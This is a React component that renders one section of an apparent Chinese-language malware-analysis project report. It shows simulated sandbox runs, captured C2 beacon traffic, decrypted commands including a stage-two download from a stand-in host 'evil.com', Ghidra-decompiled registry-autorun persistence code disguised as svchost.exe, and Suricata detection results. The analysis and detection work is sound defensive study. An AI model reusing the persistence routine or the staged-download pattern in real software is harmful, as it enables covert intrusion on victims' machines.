import React from 'react';
import { KaliTerminal } from '../shared/Terminal';

// 六、项目运行效果
export const MA06_Results: React.FC = () => {
    return (
        <>
            <div className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h2 className="text-[18pt] font-hei mb-6 font-bold">六、项目运行效果</h2>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">6.1 Wireshark流量捕获</h3>
                <p className="mb-4 indent-8 text-justify">
                    在沙箱环境中运行恶意样本，使用Wireshark捕获网络流量：
                </p>

                <KaliTerminal 
                    command="wireshark -i eth0 -k -w /tmp/malware_traffic.pcap &"
                    output={`[1] 12345`}
                />
                <p className="text-center text-sm font-bold mb-4">图 6-1 启动Wireshark捕获</p>

                <KaliTerminal 
                    command="wine ./update_service.exe"
                    output={`wine: created the configuration directory '/root/.wine'
[*] Sample running in sandbox...`}
                />
                <p className="text-center text-sm font-bold mb-4">图 6-2 在沙箱中运行恶意样本</p>

                <KaliTerminal 
                    command={`tshark -r /tmp/malware_traffic.pcap -Y "tcp.port == 8443" | head -10`}
                    output={`    1   0.000000 192.168.6.210 → 192.168.100.50 TCP 74 49152 → 8443 [SYN]
    2   0.001234 192.168.100.50 → 192.168.6.210 TCP 74 8443 → 49152 [SYN, ACK]
    3   0.001456 192.168.6.210 → 192.168.100.50 TCP 66 49152 → 8443 [ACK]
    4   0.002345 192.168.6.210 → 192.168.100.50 HTTP 234 POST /beacon HTTP/1.1
    5   0.003456 192.168.100.50 → 192.168.6.210 HTTP 178 HTTP/1.1 200 OK
    6  60.002345 192.168.6.210 → 192.168.100.50 HTTP 234 POST /beacon HTTP/1.1
    7  60.003456 192.168.100.50 → 192.168.6.210 HTTP 256 HTTP/1.1 200 OK`}
                />
                <p className="text-center text-sm font-bold mb-4">图 6-3 C2通信流量分析</p>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">6.2 C2指令解密结果</h3>
                <p className="mb-4 indent-8 text-justify">
                    使用编写的解密脚本对捕获的C2通信数据进行解密：
                </p>

                <KaliTerminal 
                    cwd="~/malware"
                    command="python3 c2_decrypt.py captured_data.txt"
                    output={`[*] C2 Traffic Decryptor
[*] Processing 5 encrypted packets...
[+] Packet 1 decrypted:
    {"type":"beacon","id":"ABC123","hostname":"VICTIM-PC"}
[+] Packet 2 decrypted:
    {"type":"cmd","payload":"whoami"}
[+] Packet 3 decrypted:
    {"type":"response","data":"victim-pc\\admin"}
[+] Packet 4 decrypted:
    {"type":"cmd","payload":"ipconfig /all"}
[+] Packet 5 decrypted:
    {"type":"download","url":"http://evil.com/stage2.exe"}
[*] Decryption completed. 5/5 packets processed.`}
                />
                <p className="text-center text-sm font-bold mb-4">图 6-4 C2指令解密结果</p>
            </div>

            <div className="page bg-white w-[210mm] min-h-[297mm] mx-auto shadow-lg mb-8 p-12 page-break">
                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">6.3 Ghidra逆向分析</h3>
                <p className="mb-4 indent-8 text-justify">
                    使用Ghidra对恶意样本进行静态逆向分析，定位关键功能：
                </p>

                <KaliTerminal 
                    command="ghidraRun"
                    output={`[*] Ghidra 11.0 starting...
[*] Loading project: MalwareAnalysis
[*] Importing: update_service.exe
[+] Auto-analysis completed`}
                />
                <p className="text-center text-sm font-bold mb-4">图 6-5 启动Ghidra分析</p>

                <div className="bg-gray-100 p-4 rounded mb-4">
                    <h4 className="font-bold mb-2">Ghidra反编译结果 - 持久化函数：</h4>
                    <pre className="text-xs font-mono">{`void install_persistence(void) {
    HKEY hKey;
    char exePath[MAX_PATH];
    
    GetModuleFileNameA(NULL, exePath, MAX_PATH);
    
    // 创建注册表自启动项
    RegOpenKeyExA(HKEY_CURRENT_USER,
        "SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        0, KEY_SET_VALUE, &hKey);
    
    RegSetValueExA(hKey, "UpdateService", 0, REG_SZ,
        (BYTE*)exePath, strlen(exePath) + 1);
    
    RegCloseKey(hKey);
    
    // 复制文件到AppData
    char destPath[MAX_PATH];
    SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, destPath);
    strcat(destPath, "\\\\Microsoft\\\\UpdateService\\\\svchost.exe");
    CopyFileA(exePath, destPath, FALSE);
}`}</pre>
                </div>
                <p className="text-center text-sm font-bold mb-4">图 6-6 Ghidra反编译的持久化函数</p>

                <h3 className="text-[14pt] font-hei font-bold mt-6 mb-4">6.4 Suricata检测验证</h3>
                <p className="mb-4 indent-8 text-justify">
                    使用编写的Suricata规则对捕获的流量进行检测验证：
                </p>

                <KaliTerminal 
                    command="suricata -r /tmp/malware_traffic.pcap -S /etc/suricata/rules/custom.rules -l /tmp/logs/"
                    output={`[*] Suricata 7.0.2 starting...
[*] Loading rules from /etc/suricata/rules/custom.rules
[+] 4 rules loaded
[*] Processing pcap file...
[+] Processing completed`}
                />
                <p className="text-center text-sm font-bold mb-4">图 6-7 运行Suricata检测</p>

                <KaliTerminal 
                    command="cat /tmp/logs/fast.log"
                    output={`12/29/2025-10:15:32.123456 [**] [1:1000001:1] MALWARE UpdateService RAT C2 Beacon Detected [**]
12/29/2025-10:15:32.234567 [**] [1:1000002:1] MALWARE UpdateService RAT Encrypted C2 Traffic [**]
12/29/2025-10:15:32.345678 [**] [1:1000004:1] MALWARE UpdateService RAT User-Agent [**]
[*] Detection rate: 100% (5/5 C2 sessions detected)`}
                />
                <p className="text-center text-sm font-bold mb-4">图 6-8 Suricata检测结果</p>
            </div>
        </>
    );
};
